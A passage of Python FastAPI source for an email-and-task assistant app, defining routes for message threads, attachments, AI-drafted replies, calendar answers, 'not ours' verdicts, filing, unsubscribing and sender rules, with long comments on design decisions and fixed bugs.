    A chat row that never became a task showed only itself in the panel, so a reply sent from
    Teams or Outlook was invisible here - even though it is ingested (channels.py stores the
    owner's own lines as `context` rows) and the assistant reads it perfectly well when it writes
    the brief. The history on screen disagreed with the history the assistant reasons from, and
    the screen was the one that was wrong.

    `context` rows are deliberately kept OUT of the feed - they are not things that happened TO
    the owner - but they are exactly what makes a thread read as a conversation, so they belong
    here."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    msgs = store.thread_messages(m.get('ConversationId'), m.get('Subject'), limit)
    # ...and what was DECIDED about it. A row with no task has no task detail to read a
    # history out of, and "not ours" is precisely the verdict that leaves it without one.
    return {'messages': [_readable(x) for x in (msgs or [m])], 'conversationId': m.get('ConversationId') or '',
            'routes': store.message_routes(mid), 'reviews': store.reviews_for_message(mid)}

@app.get('/api/messages/{mid}/attachments')
def message_attachments(mid: int):
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    from . import linkdocs
    return {'data': [_att_row(a) for a in store.list_attachments(mid)] + [_doc_row(d) for d in linkdocs.of_message(store, mid)]}


def _doc_row(d: dict) -> dict:
    """A document the message LINKS to, beside its files: name, kind and the address it opens - and what the last read found,
    from the cache (linkdocs.peek: drawing the row never dials out). `external_url` is the document's own address, never ours."""
    from . import linkdocs
    got = linkdocs.peek(d) or {}
    return {'id': d['id'], 'name': linkdocs.name_of(d, got), 'kind': d['label'], 'link': True, 'external_url': d['url'],
            'content_type': '', 'size': 0, 'inline': False, 'saved': False, 'is_image': False, 'is_audio': False, 'url': None,
            'read': 'text' in got, **({'note': got['note']} if got.get('note') else {}), **({'fix': got['fix']} if got.get('fix') else {}),
            **({'rows': got['total_rows']} if got.get('total_rows') is not None else {})}


@app.get('/api/tasks/{tid}/documents')
def task_documents(tid: int):
    "The documents a task's messages link to, once each, as the page lists them - an agent reads one with the call below."
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import linkdocs
    return {'data': [{**_doc_row(d), 'message_id': d['mid']} for d in linkdocs.of_task(store, tid)]}


@app.get('/api/tasks/{tid}/documents/{did}')
def task_document(tid: int, did: str, offset: int = 0, limit: int = 0, fresh: bool = True):
    """One linked document IN FULL, through the card that owns it: a table's rows from `offset` (up to linkdocs.FULL_ROWS a call),
    a text from character `offset`, and `related` - the files beside it in its folder. Only a document on THIS task's messages:
    the id is looked up there, so the call never opens an address a caller names with the owner's accounts."""
    from . import linkdocs
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    d = linkdocs.find_on_task(store, tid, did)
    if not d: raise HTTPException(404, f'no document {did} on {task_ref(tid)} - GET /api/tasks/{tid}/documents lists them')
    got = linkdocs.read(store, d, auto=False, full=True, fresh=fresh, offset=offset, limit=max(0, min(int(limit or 0), linkdocs.FULL_ROWS)))
    return {'id': d['id'], 'kind': d['label'], 'url': d['url'], 'name': linkdocs.name_of(d, got), **got}

@app.get('/api/attachments/{aid}')
def attachment(aid: int, download: bool = False):
    """The bytes. Images are served inline so the panel can just draw them; everything else
    downloads under its own name. Path is confined to the attachments dir; SVG/HTML never
    render as a document on this origin."""
    a = store.get_attachment(aid)
    if not a: raise HTTPException(404, 'attachment not found')
    path = _attachment_path(a.get('Path'))
    if not path:
        raise HTTPException(404, 'this one was never saved - open the original message for it')
    ct = (a.get('ContentType') or 'application/octet-stream').split(';')[0].strip() or 'application/octet-stream'
    # audio joins images as "shown in place": <audio> is a subresource like <img>, and an
    # attachment disposition on it is a download prompt waiting to happen
    inline = (not download) and ct.lower().startswith(('image/', 'audio/')) and ct.lower() not in _NOSCRIPT
    resp = FileResponse(path, media_type=ct, filename=_att_filename(a.get('Name')),
                        content_disposition_type='inline' if inline else 'attachment')
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    return resp


@app.get('/api/task-artifacts/{aid}')
def task_artifact(aid: int, download: bool = False):
    """Open or download a session artifact without exposing arbitrary local files."""
    from . import session_artifacts
    artifact = store.get_task_artifact(aid)
    if not artifact: raise HTTPException(404, 'artifact not found')
    path = session_artifacts.confined(artifact.get('Path'))
    if not path: raise HTTPException(404, 'this artifact is no longer on disk')
    # a picture the chat SHOWED (session_artifacts.shown) is drawn by <img> as itself; anything that could run - SVG, a page -
    # comes back as text like a Claude page below, for the sandboxed frame or the reader to draw (_NOSCRIPT)
    kind = str(artifact.get('ContentType') or '')
    if artifact.get('Kind') == 'shown' and kind.startswith('image/') and kind not in _NOSCRIPT:
        response = Response(path.read_bytes(), media_type=kind)
        response.headers['Content-Disposition'] = f'{"attachment" if download else "inline"}; filename="{_att_filename(artifact.get("Name"))}"'
        response.headers['X-Content-Type-Options'] = 'nosniff'
        return response
    text = path.read_text(encoding='utf-8', errors='replace')
    # a page a Claude session published: the task page draws it in a sandboxed frame from this TEXT -
    # served as plain text, so opening the url itself never runs the page as Taskuary (_NOSCRIPT)
    if artifact.get('Kind') in ('claude_artifact', 'shown'): media = 'text/plain; charset=utf-8'
    else:
        # Old artifacts copied the raw PTY stream after the useful result. Keep that durable source
        # file intact, but do not make the in-app reader render terminal repaints and tool chatter.
        text, media = text.split('\n## Full session transcript', 1)[0].rstrip() + '\n', 'text/markdown; charset=utf-8'
    response = Response(text, media_type=media)
    disposition = 'attachment' if download else 'inline'
    response.headers['Content-Disposition'] = f'{disposition}; filename="{_att_filename(artifact.get("Name"))}"'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

@app.get('/api/task-outputs/{tid}')
def task_outputs(tid: int):
    "The files an agent made for this task in its outputs folder (outputs.py), as the page lists them."
    from . import outputs
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    return {'data': outputs.listing(tid), 'folder': f'scratch/outputs/{task_ref(tid)}'}


@app.get('/api/task-outputs/{tid}/{rel:path}')
def task_output(tid: int, rel: str, download: bool = False, preview: bool = False, sheet: str = ''):
    """One file from THIS task's outputs folder - a name inside it, never a path out of it (outputs.resolve). `preview` gives a
    workbook's sheet as rows (outputs.sheet); otherwise the bytes: a picture drawn as itself, text and anything that could run as
    plain text, the rest as a download under its own name (_NOSCRIPT, as the attachment and artifact routes do)."""
    from . import outputs
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    path = outputs.resolve(tid, rel)
    if not path: raise HTTPException(404, f'no file {rel!r} in the outputs of {task_ref(tid)}')
    if preview:
        if outputs.PREVIEW.get(path.suffix.lower()) != 'sheet': raise HTTPException(422, 'only a workbook has a sheet preview - open the file itself')
        if not outputs.can_sheet():
            raise HTTPException(501, 'No preview on this install (it needs openpyxl) - Download opens it in your spreadsheet app.')
        try: return outputs.sheet(path, sheet)
        except Exception as e:
            logger.info(f'task {tid} output {path.name} not previewed - {e}')
            raise HTTPException(422, 'This workbook could not be read for a preview - Download it to open it.')
    ct = outputs.content_type(path.name)
    low = ct.lower()
    if download or not (low.startswith(('image/', 'text/')) or low in ('application/json', 'application/pdf')):
        resp = FileResponse(path, media_type=ct, filename=_att_filename(path.name), content_disposition_type='attachment')
    else:
        # in place: a picture as itself, a PDF for the viewer, text (and SVG/HTML, which could run as Taskuary) as plain text
        media = ct if (low.startswith('image/') or low == 'application/pdf') and low not in _NOSCRIPT else 'text/plain; charset=utf-8'
        resp = FileResponse(path, media_type=media, filename=_att_filename(path.name), content_disposition_type='inline')
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    return resp

@app.post('/api/messages/{mid}/attachments/fetch')
def fetch_attachments(mid: int):
    """Pull a message's attachments now - for mail that arrived before Taskuary kept them, and
    for a retry after a Graph hiccup."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    ext = str(m.get('ExternalId') or '')
    if m.get('Channel') != 'email' or not ext.startswith('graph:'):
        raise HTTPException(422, 'only Outlook mail can be re-fetched')
    # the card that reads this mailbox: with two Outlook accounts the first card's token cannot open the second one's mail
    from .outbound import _source_connector_id
    own = _source_connector_id(store, 'email', m.get('SourceName'))
    c = store.get_connector(own, with_secret=True) if own else store.get_connector_by_type('outlook', with_secret=True)
    if not c or c.get('Type') != 'outlook': raise HTTPException(422, 'no Outlook connection')
    from .channels import fetch_mail_attachments, graph_creds, graph_token
    try:
        gcfg, gsec, _ = graph_creds(store, c)
        n = fetch_mail_attachments(store, mid, graph_token(gcfg, gsec), m.get('SourceName'), ext.split(':', 1)[1])
    except Exception as e:
        raise HTTPException(422, str(e)[:300])
    return {'fetched': n, 'data': [_att_row(a) for a in store.list_attachments(mid)]}

# ── answering the calendar (calwrite.py): each press DRAFTS into the approval queue; only the owner's Send writes the calendar ──
def _cal_refusal(e) -> dict:
    """The one line a press that cannot be drafted answers with, and its way out (failures.py's fix shape) - 200, so the row
    says it where it was pressed instead of an error toast."""
    from . import calwrite
    if isinstance(e, calwrite.NoAccess): return {'ok': False, 'say': str(e), 'fix': e.fix}
    return {'ok': False, 'say': str(e)[:300], 'fix': None}

@app.get('/api/messages/{mid}/calendar/slots')
def calendar_slots(mid: int, act: str = 'schedule'):
    """The 2-3 free times Propose a new time and Find a time offer - checked against the card's right to write FIRST, so a
    read-only card says so at the press, not after a pick."""
    from . import calwrite
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    if act not in ('propose', 'schedule'): raise HTTPException(422, 'slots are for proposing or finding a time')
    try:
        calwrite.require_write(store, calwrite.account(store, m))
        out = calwrite.slots_for(store, m, act)
    except Exception as e: return _cal_refusal(e)
    c = calwrite.invite_of(m) or {}
    return {'ok': True, **out, 'act': act, 'subject': c.get('subject') if act == 'propose' else calwrite._title(m),
            **({'now': calwrite.when(c.get('start'), c.get('end'))} if act == 'propose' and c.get('start') else {})}

class CalendarBody(BaseModel):
    act: str
    start: str | None = None
    end: str | None = None

@app.post('/api/messages/{mid}/calendar')
def calendar_answer(mid: int, body: CalendarBody):
    """Accept, Decline, Propose a new time or Find a time, pressed: the answer drafted as a review on the message (and its
    task) for the owner's Send - nothing reaches the calendar here. {ok, reviewId, taskId, say} or {ok: false, say, fix}."""
    from . import calwrite
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    try: out = calwrite.draft(store, mid, body.act, body.start, body.end, ACTOR)
    except Exception as e: return _cal_refusal(e)
    return {'ok': True, **out}

class OpenReplyBody(BaseModel):
    draft: bool = True
    instruction: str | None = None
    # "make it shorter": write it AGAIN over the draft that is there. Without this the model
    # claimed the edit and the next approve sent the untouched original (2026-09-03).
    redraft: bool = False
    # REPLY OPENS AT ONCE (the owner, 2026-10-01: "never waits on the AI"): the box now, the draft owed - the page asks
    # /api/reviews/{rid}/draft for it behind the card, which reads the provider first as this door would have
    later: bool = False
    # LOOP THEM IN (the owner, 2026-10-13: "it should create reply with looping in the new person"): names or addresses copied
    # on the reply - looked up among the people who have written, the hand-off's book; one nobody knows is said, not guessed
    cc: list[str] | None = None
    # the instruction is the app's own (a chase's brief), not the owner's words: it rides into the draft and is not kept as theirs
    app_words: bool = False

@app.post('/api/messages/{mid}/reply')
def open_reply(mid: int, body: OpenReplyBody = None):
    """Put a reply on the table for ANY message - the agent finished and you want to answer, or
    triage never queued one. Creates the pending review (reusing one if it exists) and, unless
    draft=false, writes the AI draft right now so the box comes back filled. Approving still
    sends; nothing here does."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    # NOBODY SENT IT, SO THERE IS NOBODY TO ANSWER. A finished session already knows this rule and
    # skips the draft (wrapup.no_one_behind); this door did not ask, so pressing Write reply on a task
    # the owner typed himself sent the drafter a thread with no correspondent in it - and it answered
    # the OWNER, analysis first, with a letter suggested underneath, in the box whose button sends
    # (the owner, 2026-09-22, TQ-0674). A channel that cannot CARRY a reply is a different question
    # and still drafts (PW-237): there the answer is real, it just leaves by another road.
    from .wrapup import no_one_behind
    if no_one_behind(m.get('Channel')):
        raise HTTPException(422, 'nobody sent this, so there is nobody to answer - work it, or write '
                                 'what you found on the task itself')
    later = body is not None and body.later
    if not later:                     # the draft behind a box opened at once reads the provider itself (draft_review)
        try: _refresh_chat_context(task_id=m.get('TaskId'), message_id=mid)
        except RuntimeError as e: raise HTTPException(503, str(e))
    # The requested row may no longer be the end of the conversation after that sync.  Draft and
    # deliver against the newest inbound line, while keeping the same task/review.
    m = (_latest_context_message(m.get('TaskId'), mid) or store.get_message(mid) or m)
    mid = m['MessageId']
    # a FILED message stays filed: answering it is a reply, not a project, and promoting it to a
    # task just to hold the review put a TQ badge on chatter. The review rides task-less.
    tid = m.get('TaskId')
    # ...and a thread its own last reply CLOSED comes back when the owner opens another one. The
    # draft was created on the done task, where the queue's visibility rule hides it, so the card
    # asking for the yes said "already handled" over the message instead of showing the draft, and
    # every click stacked one more invisible review (TQ-0426, 2026-09-07). Answering again is work.
    if tid and (store.get_task(tid) or {}).get('Status') in ('done', 'dropped'):
        store.update_task(tid, {'Status': 'waiting'}, ACTOR)
    rv = store.pending_review(tid) if tid else None
    rid = rv['ReviewId'] if rv else store.add_review({'TaskId': tid, 'MessageId': mid, 'Kind': 'draft',
                                                      'Status': 'pending', 'Reason': 'you opened a reply on this message'})
    draft = (rv or {}).get('DraftText') or ''
    if rv and rv.get('MessageId') != mid:
        draft = ''                    # a correct old draft is still wrong for a newer conversation
    if body is not None and body.redraft: draft = ''          # write it again over what is there
    # ...and so do the owner's own words for it: "reply to Marcus: yes, Thursday at 2 works" found the draft written before
    # and showed it unchanged - it said to check the calendar (2026-10-06)
    if body is not None and (body.instruction or '').strip():
        draft = ''
        # ...and kept, not thrown away once the model has read them (2026-10-23) - the owner's own, never a chase's brief
        if not body.app_words: _keep_instruction(rid, body.instruction)
    owed = not draft and (body is None or body.draft)
    if owed and not later:
        try:
            draft = (responder.write_draft(store, tid, rid, actor=ACTOR, nudge=_reply_nudge(body and body.instruction)) if tid
                     else responder.draft_for_message(store, m, rid, instruction=_reply_nudge(body and body.instruction)))
        except Exception as e:
            logger.warning(f'reply draft failed for message {mid}: {e}')   # the box opens empty; write it yourself
    if body is not None and body.redraft and draft: store.update_review_draft(rid, draft, (rv or {}).get('RunId'))
    # WHO IT GOES TO, AT ONCE: the envelope was pinned only when the AI's draft landed (responder.write_draft), so a fresh box -
    # Write another above all - showed the sender alone and no CC for the seconds the model took (2026-10-13). It is a lookup on
    # the message, nothing to wait for; a draft finds it set and keeps it, an envelope the owner set already stays.
    if str(m.get('Channel') or '').lower() == 'email' and not store.review_envelope(rid):
        env = outbound.reply_envelope(store, m)
        if env: store.set_review_envelope(rid, env)
    store.audit('review', rid, 'redraft' if (body is not None and body.redraft) else 'open_reply', ACTOR, detail={'message_id': mid})
    looped, unknown = _loop_in(rid, m, (body.cc if body is not None else None) or [])
    return {'reviewId': rid, 'taskId': tid, 'draft': draft, 'drafting': bool(owed and later),
            **({'cc': looped} if looped else {}), **({'cc_unknown': unknown} if unknown else {})}


def _loop_in(rid: int, m: dict, who: list) -> tuple:
    """Copy `who` on the reply: its envelope is the reply's own (Reply all, outbound.reply_envelope) with them in CC - the card
    shows the CC line and Approve sends it. ([addresses copied], [names nobody by that name has written as])."""
    from . import concierge, outbound
    if not who: return [], []
    found = [(w, concierge.person(store, w)) for w in who if str(w or '').strip()]
    adds, unknown = [p['Email'].lower() for _, p in found if p and p.get('Email')], [w for w, p in found if not p]
    if not adds or str(m.get('Channel') or '').lower() != 'email': return [], unknown     # a chat has members, not a cc
    rv = store.get_review(rid) or {}
    try: env = json.loads(rv.get('Deliver') or '{}') or {}
    except ValueError: env = {}
    if not env: env = outbound.reply_envelope(store, m) or {'kind': 'reply'}
    have = {a.lower() for a in (env.get('to') or []) + (env.get('cc') or [])}
    env['cc'] = list(env.get('cc') or []) + [a for a in dict.fromkeys(adds) if a not in have]
    store.set_review_deliver(rid, json.dumps(env))
    return [a for a in adds], unknown


def _keep_instruction(rid: int, said: str):
    """The owner's words for a draft, kept on its review (phase B) - and the second time the same words are said for one person, they
    are how that person is written to: a STYLE.md "By recipient" line every later draft to them reads (byrecipient, phase C;
    the owner, 2026-10-23: the typed instruction is stored and remembered, the 2nd time a style line, no chips)."""
    store.add_review_instruction(rid, said)
    from . import byrecipient
    byrecipient.note_instruction(store, rid, said)


def _reply_nudge(instruction) -> str | None:
    """The owner's own words on what to say ("tell Omar it is not owned here"), ridden into the draft."""
    said = (instruction or '').strip()
    return f"THE OWNER'S INSTRUCTION FOR THIS REPLY - follow it: {said}" if said else None


class NotMineBody(BaseModel):
    note: str | None = None
    scope: str = 'sender'
    topic: str | None = None        # the owner's own wording for a 'subject' verdict's key
class IgnoreSenderBody(BaseModel):
    how: str = 'rule'               # 'rule' = an exclusion rule in Settings | 'memory' = a learned verdict

NOT_MINE_SCOPES = ('subject', 'sender', 'sender_domain', 'global')

def _topic_key(m: dict) -> str:
    """The topic a subject-scoped verdict keys on. Empty when the subject has too little in it
    to match on, which is when the verdict has to be about the sender instead."""
    from .routing import subject_topic
    return subject_topic(m.get('Subject') or '')

def _suggest_scope(m: dict) -> str:
    """Which scope this verdict most likely means. It defaulted to 'sender', and that is the
    wrong guess for what people actually write: "resident refunds are not our task" is about a
    KIND OF WORK, and filed under one colleague on a seventeen-person thread it never fired
    again. A subject to key on means the topic is the better bet; the owner still chooses."""
    return 'subject' if _topic_key(m) else 'sender'

def _not_mine_note(m: dict, scope: str = None, topic: str = None) -> str:
    """The note we would write: an EVIDENCE line - when, what subject, from whom, what the owner
    said - never a rule. The scope only decides which later messages this line is pulled up
    for (by topic, by sender, by their domain, or always); the model reads the line itself and
    judges how alike the new message is. So the wording carries the specifics whatever the
    scope, and the owner can still say it in their own words."""
    who = m.get('FromEmail') or m.get('FromName') or 'an unknown sender'
    subj = (m.get('Subject') or '')[:90]
    when = str(m.get('SentAt') or '')[:10]
    scope = scope or _suggest_scope(m)
    about = (f' - the topic "{topic or _topic_key(m)}"' if scope == 'subject' and (topic or _topic_key(m)) else
             f' - anyone at {who.rsplit("@", 1)[-1]}' if scope == 'sender_domain' else
             ' - whoever sends it' if scope == 'global' else '')
    return f'{when}: "{subj}" from {who}{about} - NOT OURS: other people\'s work, no task, no reply'

@app.post('/api/messages/{mid}/not-mine')
def not_mine(mid: int, body: NotMineBody, background: BackgroundTasks = None):
    """"Not our task." Two things happen: this item stops being work, and the reason is written
    to MEMORY - which the funnel reads on every later message it applies to (ingest.notes_for
    for the classifier, ingest.veto before a message joins an existing task), so the same
    verdict doesn't have to be given twice. Unlike "Skip this sender", their mail keeps
    arriving; only the judgement is learned.

    SCOPE is the whole game, and 'sender' was the wrong default: most verdicts are about a kind
    of work, not a person, and a topic rule keyed to one colleague on a long thread never fires
    again. 'subject' keys on the topic and matches by overlap, so the next resident, invoice or
    ticket number in the subject line does not slip past it."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    em = (m.get('FromEmail') or '').lower()
    if body.scope not in NOT_MINE_SCOPES: raise HTTPException(422, 'bad scope')
    scope = body.scope
    # a scope with nothing to key on would save a verdict that can never match: fall back to the
    # widest thing this message CAN be keyed on rather than writing a note that does nothing
    # the owner can say what the topic IS - they know that "resident refund request" is the
    # standing part and the resident's name is not, and no amount of trimming beats being told
    from .routing import norm_subject, tokens
    topic = norm_subject((body.topic or '').strip())[:200] or _topic_key(m)
    if scope == 'subject' and len(tokens(topic)) < 2: scope = 'sender' if em else 'global'
    if scope in ('sender', 'sender_domain') and not em: scope = 'global'
    key = (topic if scope == 'subject' else None if scope == 'global'
           else em.rsplit('@', 1)[-1] if scope == 'sender_domain' else em)
    note = (body.note or '').strip() or _not_mine_note(m, scope, key if scope == 'subject' else None)
    memid = store.add_memory({'Scope': scope, 'ScopeKey': key, 'Note': note[:1000],
                              'Source': 'verdict', 'Active': 1, 'CreatedBy': ACTOR})
    learn.note_verdicts(store)
    tid = m.get('TaskId')
    fate = ''
    if tid and store.get_task(tid):
        store.audit('task', tid, 'not_mine_delete', ACTOR, detail={'message_id': mid, 'memory_id': memid})
        fate = _file_task(tid, f'not ours - {note[:80]}')     # deleted, or archived when an agent worked it
    store.set_message_status(mid, 'ignored')
    store.add_route(mid, None, 'ignore', None, f'not ours - {note[:200]}', [], ACTOR)
    store.audit('memory', memid, 'create', ACTOR, detail={'scope': scope, 'key': key, 'from': em})
    # "not ours" draws a responsibility boundary - the general shape of it belongs in LEARNED.md
    if background is not None:
        background.add_task(learn.learn_from, store,
                            f"mem{memid}: owner said NOT OURS ({scope}): \"{(m.get('Subject') or '')[:80]}\" "
                            f"from {em or '?'} - {note[:200]}")
    return {'ok': True, 'memoryId': memid, 'note': note, 'scope': scope, 'scopeKey': key,
            'taskDeleted': fate == 'deleted', 'taskArchived': fate == 'archived', 'ref': task_ref(tid) if tid else None,
            'alsoCovered': _also_covered(scope, key, tid)}

def _also_covered(scope: str, key: str, dropped_tid) -> list:
    """Other OPEN tasks this new verdict now covers - REPORTED, never deleted. One click that
    silently removes five tasks is not a verdict, it is a surprise. But saying nothing is how
    "the system is not learning it" happens: the verdict works from now on while yesterday's
    tasks sit there looking like proof that it did not."""
    from .ingest import topic_hit
    if scope == 'global' or not key: return []
    out = []
    for t in store.snapshots():
        if t['task_id'] == dropped_tid: continue
        hit = (any(topic_hit(key, s) for s in t['subjects']) if scope == 'subject'
               else any((e or '').lower().endswith('@' + key) for e in t['senders']) if scope == 'sender_domain'
               else key in {(e or '').lower() for e in t['senders']})
        if hit: out.append({'taskId': t['task_id'], 'title': t['title']})
    return out[:20]

@app.post('/api/messages/{mid}/file')
def file_message(mid: int, body: NotATaskBody = None, background: BackgroundTasks = None):
    """"Not a task - just conversation" / "Nothing to do here" - the timeline's door onto the
    SAME verdict the task list's "Not a task" gives, and now teaching the same thing through it
    (owner, 2026-08-30). It used to teach nothing at all, which was the right answer to the wrong
    problem: what made the old exit dangerous was "Not our task" writing a verdict against the
    SENDER - and against every sender at once on a channel with no address, like Teams. A
    NOT A TASK note keyed to the topic is not that, and _teach_not_a_task writes nothing when
    there is nothing to key it to. No sender is ever muted here; that is "Skip this sender".

    Either way the rest of THIS conversation is filed with it - the owner ignore route below is
    what ingest.veto reads (store.owner_verdict_on_thread), because "not a task" said on a thread
    and then a task from its next reply is the funnel arguing with itself."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    tid, fate = m.get('TaskId'), ''
    if tid and store.get_task(tid):
        store.audit('task', tid, 'filed_not_work', ACTOR, detail={'message_id': mid})
        # never delete work: a task an agent has been on is CLOSED and kept, report and all
        fate = 'archived' if (body is not None and body.archive) else _file_task(tid, 'filed from the pipe')
        if fate == 'archived' and store.get_task(tid) and store.get_task(tid).get('Status') not in ('done', 'dropped'):
            store.update_task(tid, {'Status': 'done'}, ACTOR)
            store.add_comment(tid, ACTOR, 'human', 'Archived from the pipe - closed, not deleted.')
    learned = _teach_not_a_task(m, background) if (body is None or body.learn) else None
    verdict, route_id = operations.verdict_of_message(store, m)
    store.set_message_status(mid, 'ignored')
    store.add_route(mid, None, 'ignore', None, 'nothing to do - filed by the owner', [], ACTOR)
    # ARCHIVE and FILE IT are "I am done with this": both filed the mail and left it UNREAD under FYI on the walk (press
    # audit, 2026-10-01). Every door here writes at least what Next writes - the read receipt - so a new reply still brings it back.
    from . import funnel
    archived = body is not None and body.archive
    try: funnel.settle(store, f'msg:{mid}', 'surfaced', ACTOR, read=True, note='archived' if archived else 'filed')
    except Exception as e: logger.debug(f'the filed message {mid} did not settle read: {e}')
    operations.record_direct(store, 'message.file', mid, {}, ACTOR, {'taskDeleted': fate == 'deleted', 'taskArchived': fate == 'archived'}, verdict=verdict, route_id=route_id)
    return {'ok': True, 'taskDeleted': fate == 'deleted', 'taskArchived': fate == 'archived',
            'ref': task_ref(tid) if tid else None, 'memoryId': learned}

class UnsubscribeBody(BaseModel):
    open: bool = False          # the desktop app has no browser of its own: Taskuary opens the list's page for it (as /api/open-url)

@app.post('/api/messages/{mid}/unsubscribe')
def unsubscribe_message(mid: int, request: Request, body: UnsubscribeBody = None):
    """The FYI card's Unsubscribe (the owner, 2026-10-22). Owner-only: a list is left on the owner's press and never on an agent's
    - an agent's context is full of mail, and a newsletter talking one into leaving lists is exactly what this refuses. The link is
    the one ingest stored off the list's own headers, never one the client sends (unsubscribe.py)."""
    _owner_only(request, "leaving a list is the owner's press")
    from . import unsubscribe
    if not store.get_message(mid): raise HTTPException(404, 'message not found')
    try: out = unsubscribe.run(store, mid, ACTOR)
    except LookupError as e: raise HTTPException(422, str(e))
    except RuntimeError as e: raise HTTPException(502, str(e))
    if out.get('link') and body is not None and body.open:
        import webbrowser
        threading.Thread(target=webbrowser.open, args=(out['link'],), daemon=True).start()
        out['opened'] = True
    return out

@app.get('/api/working')
def working_numbers():
    """"Is it working?" (the owner, 2026-10-22): whether the app's drafts, triage verdicts and agent results stood, over the last 7
    and 30 days - counted from the owner's own next moves (working.py)."""
    from . import trackrecord, working
    # ...and the drafts' track record by kind and recipient domain (2026-10-25) - read-only: nothing sends on it
    return {'windows': working.windows(store), 'record': trackrecord.patterns(store, 30)}

@app.get('/api/messages/{mid}/not-mine/suggest')
def not_mine_suggest(mid: int, scope: str = None, topic: str = None):
    """The note we'd save, so the panel can show it for editing before it's committed - phrased
    for `scope`, or for the scope this message most likely calls for when none is given."""
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    if scope and scope not in NOT_MINE_SCOPES: raise HTTPException(422, 'bad scope')
    scope = scope or _suggest_scope(m)
    from .routing import norm_subject
    topic = norm_subject((topic or '').strip())[:200] or _topic_key(m)
    return {'note': _not_mine_note(m, scope, topic), 'from': m.get('FromEmail'), 'scope': scope,
            'topic': topic}

@app.post('/api/messages/{mid}/ignore-sender')
def ignore_sender(mid: int, body: IgnoreSenderBody, background: BackgroundTasks = None):
    """"Ignore this sender" is two different acts, and the owner asked to be asked which
    (2026-09-04: "shoudl I add it to exclusion rule in setting or just a memory").

    rule    an exclusion rule (Settings -> Rules): the sender never reaches triage again, and
            policy.apply_retroactively pulls their existing rows off the timeline too. The bigger
            hammer, and reversible - switching the rule off puts the history back.
    memory  a learned verdict: their mail keeps arriving and stays readable, but the classifier
            reads the verdict on every later message like it. Nothing disappears.

    Neither is the silent default, which is why the card offers both and the chat asks first.
    """
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    em = (m.get('FromEmail') or '').lower().strip()
    if not em: raise HTTPException(422, 'this message has no sender address to key a rule on')
    if body.how == 'memory':
        return {**not_mine(mid, NotMineBody(scope='sender'), background), 'how': 'memory', 'sender': em}
    if body.how != 'rule': raise HTTPException(422, "how must be 'rule' or 'memory'")
    pid = store.save_policy({'Name': f'Skip {em}', 'Kind': 'sender', 'Pattern': em, 'Action': 'skip',
                             'Reason': f'the owner said to ignore mail from {em}', 'Active': 1}, ACTOR)
    store.audit('policy', pid, 'create', ACTOR, detail={'from': em, 'message_id': mid, 'via': 'ignore-sender'})
    saved = next((p for p in store.list_policies(active_only=False) if p['PolicyId'] == pid), None)
    hidden = policy_engine.apply_retroactively(store, saved or {})
    if hidden: store.audit('policy', pid, 'apply_history', ACTOR, detail={'messages': hidden})
    # ...and the WORK their mail already made. apply_retroactively only hides messages, so the task
    # triage had already cut from one of them stayed open and kept being offered - the owner silenced
    # the sender and the very next thing the pipe showed was that sender again (2026-09-15: "i put
    # this in that ignore sender but then it showed up again?").
    # READ, exactly what pressing Next writes (concierge surfaces an item with read=True) - never
    # closed: silencing who reported a thing is not a verdict on the thing. Nobody's work is thrown
    # away, and a new arrival on the task makes it unread again, as any read receipt does.
    quieted = []
    from . import funnel as _funnel
    for t in store.live_tasks_from_sender(em):
        try:
            _funnel.settle(store, f"task:{t['TaskId']}", 'surfaced', ACTOR, read=True,
                           note=f'the owner silenced {em}')
            quieted.append(t['TaskId'])
        except Exception as e: logger.debug(f"task {t['TaskId']} did not settle under the new rule: {e}")
    if quieted: store.audit('policy', pid, 'quiet_tasks', ACTOR, detail={'tasks': quieted})
    from . import outcomes                           # the ledger: regret if their mail becomes work anyway (after the rule has done its work)
    outcomes.record(store, 'sender.ignored', 'policy', pid, ACTOR, facts={'from': em, 'rule': 'skip'})
    return {'ok': True, 'how': 'rule', 'policyId': pid, 'affected': hidden, 'sender': em,
            'quieted': quieted}

def start_session(store_, tid: int, agent: str = None, model: str = None, instruction: str = None,
                  brain: str = None) -> dict:
    try:
        _refresh_chat_context(task_id=tid)
        # `agent` is the ROLE, `brain` is which CLI runs it - two questions, two arguments
        return hub_term.start_on_task(store_, tid, agent or hub_agents.default_agent(store_), model, instruction,
                                      ACTOR, brain=brain)
    except (ValueError, RuntimeError, FileNotFoundError) as e:
        raise HTTPException(422, str(e))


# ONE START AT A TIME PER TASK. A start takes seconds (a CLI booting in its checkout) and the live-session check below
# only sees a session once it exists, so two dispatches 0.5 s apart both passed it: TQ-1059 got two coding sessions in
# one checkout, the second finding "changes I didn't make", and its rail row read the idle one as waiting on you while
# the other worked (2026-10-13). A dispatch that arrives while one is under way waits for it and answers with ITS
# start - the same session, `existing` - rather than a second worker or a 409 for a press that was only sent twice.
_STARTING, _STARTED, _STARTING_LOCK = {}, {}, threading.Lock()


def _dispatch_task_to_its_agent(tid: int, body: DispatchBody, background: BackgroundTasks) -> dict:
    with _STARTING_LOCK: gate = _STARTING.setdefault(int(tid), threading.Lock())
    waited = not gate.acquire(blocking=False)
    if waited: gate.acquire()
    try:
        first = _STARTED.pop(int(tid), None) if waited else None
        live = hub_term.session_for(tid)
        if first and ((live and live.alive) or first.get('dispatch') == 'assistant'):
            return {**first, 'started': False, 'existing': True}
        _STARTED.pop(int(tid), None)
        out = _dispatch_one(tid, body, background)
        _STARTED[int(tid)] = out
        return out
    finally: gate.release()


def _dispatch_one(tid: int, body: DispatchBody, background: BackgroundTasks) -> dict:
    """Start the explicitly selected kind of agent, or preserve an existing task kind.

